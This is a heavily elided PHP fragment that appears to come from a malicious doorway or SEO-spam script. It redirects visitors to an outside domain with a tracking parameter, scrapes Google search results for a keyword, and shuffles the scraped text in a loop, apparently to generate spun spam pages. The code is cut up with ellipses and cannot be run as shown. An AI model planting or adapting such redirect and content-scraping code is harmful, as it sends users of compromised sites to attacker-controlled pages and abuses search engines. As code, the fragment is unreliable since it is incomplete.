...
{
	header("Location: http://bipaoeity.in/for/77?d=$d");
exit;
}
';
$cachepath="./par";
...
$pageparse=implode(".", $pageparse);
	...
	for ($i=0; $i<1000; $i++){
		...
		//$pageparse4=$pageparse3." ".$pageparse2;
		shuffle($pageparse4);
...
$pageparse=file_get_contents("https://www.google.com/search?q=".$keyforparse."&newwindow=1&source=lnt&sa=X");
